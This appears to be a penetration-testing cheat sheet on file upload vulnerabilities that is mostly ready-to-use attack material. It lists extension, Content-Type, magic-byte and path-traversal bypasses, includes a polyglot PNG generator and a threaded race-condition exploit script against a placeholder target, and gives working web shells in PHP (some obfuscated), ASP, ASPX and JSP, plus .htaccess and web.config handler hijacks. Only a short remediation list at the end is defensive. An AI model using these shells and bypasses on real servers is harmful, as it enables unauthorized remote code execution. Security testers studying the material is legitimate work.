# File Upload Vulnerabilities

File upload vulnerabilities occur when an application allows users to upload files without adequately validating file type, content, or storage location, enabling attackers to upload malicious files such as web shells, overwrite critical files, or execute arbitrary code.

## Extension Bypass Techniques

### Alternative PHP Extensions

```
.php      — standard
.php3     — PHP 3 legacy
.php4     — PHP 4 legacy
.php5     — PHP 5 legacy
.php7     — PHP 7
.pht      — PHP handler
.phtml    — PHP HTML
.phar     — PHP archive
.phps     — PHP source (may display or execute)
.inc      — include file (sometimes parsed as PHP)
.module   — Drupal module file
```

### Alternative ASP/ASPX Extensions

```
.asp, .aspx, .ashx, .asmx, .ascx
.config   — web.config can execute code
.cshtml   — Razor pages
.vbhtml   — VB Razor pages
.svc      — WCF service
```

### Alternative JSP Extensions

```
.jsp, .jspx, .jsw, .jsv
.jspf     — JSP fragment
.war      — web archive (deploy to Tomcat)
```

### Double Extensions

```
shell.php.jpg       — may be parsed as PHP if misconfigured
shell.php.png
shell.jpg.php       — relies on last-extension parsing
shell.php%00.jpg    — null byte truncation (older systems)
shell.php;.jpg      — semicolon bypass (IIS)
shell.asp;.jpg      — IIS semicolon parsing
```

### Case Variation

```
shell.PhP
shell.pHP
shell.PHP
shell.Php5
```

### Trailing Characters

```
shell.php.
shell.php...
shell.php%20
shell.php%0a
shell.php%0d%0a
shell.php::$DATA    — Windows NTFS alternate data stream
shell.php/
shell.php\
```

## Content-Type Bypass

Intercept the upload request and change the Content-Type header:

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------Boundary--
```

Common allowed Content-Types to try:

```
image/jpeg
image/png
image/gif
application/pdf
application/octet-stream
text/plain
```

## Magic Byte Manipulation

Prepend valid file magic bytes to the malicious file:

```bash
# GIF header + PHP shell
echo -n 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# JPEG header + PHP shell (hex: FF D8 FF E0)
printf '\xFF\xD8\xFF\xE0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# PNG header + PHP shell
printf '\x89PNG\r\n\x1a\n' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# PDF header + PHP shell
echo '%PDF-1.4' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

## Polyglot Files

Create files that are simultaneously valid in two formats:

### JPEG/PHP Polyglot

```bash
# Use exiftool to inject PHP into JPEG metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

### GIF/PHP Polyglot

```php
GIF89a<?php system($_GET['cmd']); ?>
```

### PNG/PHP Polyglot

```bash
# Create minimal valid PNG with PHP in tEXt chunk
python3 -c "
import struct, zlib
png = b'\x89PNG\r\n\x1a\n'
# IHDR chunk
ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff
png += struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)
# tEXt chunk with PHP payload
text_data = b'Comment\x00<?php system(\$_GET[\"cmd\"]); ?>'
text_crc = zlib.crc32(b'tEXt' + text_data) & 0xffffffff
png += struct.pack('>I', len(text_data)) + b'tEXt' + text_data + struct.pack('>I', text_crc)
# IDAT chunk
raw = zlib.compress(b'\x00\x00\x00\x00')
idat_crc = zlib.crc32(b'IDAT' + raw) & 0xffffffff
png += struct.pack('>I', len(raw)) + b'IDAT' + raw + struct.pack('>I', idat_crc)
# IEND chunk
iend_crc = zlib.crc32(b'IEND') & 0xffffffff
png += struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
open('polyglot.png','wb').write(png)
"
```

## Upload Path Traversal

Manipulate the filename to write outside the upload directory:

```http
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
Content-Disposition: form-data; name="file"; filename="..%2F..%2F..%2Fshell.php"
Content-Disposition: form-data; name="file"; filename="....//....//....//shell.php"
Content-Disposition: form-data; name="file"; filename="%2e%2e%2f%2e%2e%2fshell.php"
```

Windows path traversal:

```http
Content-Disposition: form-data; name="file"; filename="..\..\..\..\inetpub\wwwroot\shell.aspx"
```

## Race Condition Exploitation

Some applications upload the file first, then validate and delete it:

```python
import requests
import threading

target = "http://target.com/uploads/shell.php"
upload_url = "http://target.com/upload"

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    while True:
        requests.post(upload_url, files=files)

def access():
    while True:
        resp = requests.get(target, params={'cmd': 'id'})
        if resp.status_code == 200 and 'uid=' in resp.text:
            print(f"[+] Success: {resp.text}")
            return

# Launch multiple threads
for _ in range(10):
    threading.Thread(target=upload, daemon=True).start()
    threading.Thread(target=access, daemon=True).start()
```

## Web Shell Techniques

### Minimal PHP Shells

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?=`$_GET[cmd]`?>
```

### Obfuscated PHP Shell

```php
<?php
$f = 'sys'.'tem';
$f($_REQUEST['c']);
?>
```

```php
<?php
$a = str_rot13('flfgrz');  // system
$a($_GET['c']);
?>
```

```php
<?php
preg_replace('/.*/e', 'system("id")', '');  // PHP < 7
?>
```

### ASP/ASPX Shell

```asp
<%eval request("cmd")%>
```

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.UseShellExecute = false;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
%>
```

### JSP Shell

```jsp
<%
Runtime rt = Runtime.getRuntime();
String[] cmd = {"/bin/sh", "-c", request.getParameter("cmd")};
Process p = rt.exec(cmd);
java.io.InputStream is = p.getInputStream();
int c;
while ((c = is.read()) != -1) out.print((char)c);
%>
```

## .htaccess Upload

If `.htaccess` can be uploaded to the upload directory:

```apache
# Make .jpg files execute as PHP
AddType application/x-httpd-php .jpg

# Or use handler
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

Then upload a PHP shell with a `.jpg` extension.

## web.config Upload (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

## Testing Methodology

1. Identify upload functionality and allowed file types
2. Upload a legitimate file and note the storage path and URL
3. Test extension bypass techniques (.php5, .phtml, double extension, case variation)
4. Test Content-Type header manipulation
5. Test magic byte prepending to bypass server-side content inspection
6. Test filename path traversal to write files outside upload directory
7. Test `.htaccess` / `web.config` upload for handler reconfiguration
8. Test race conditions if server validates after initial write
9. If image processing is applied, try polyglot payloads that survive resizing
10. Verify uploaded file is accessible and executes via HTTP request

## Remediation Checks

- Validate file extension against a strict allowlist (not a denylist)
- Verify Content-Type and magic bytes match the expected file type
- Rename uploaded files with a random, server-generated name
- Store uploads outside the web root or on a separate domain
- Serve uploaded files with `Content-Disposition: attachment` header
- Apply file size limits to prevent resource exhaustion
- Strip metadata and re-encode images using a library like ImageMagick (with policy restrictions)
- Disable script execution in the upload directory via server configuration
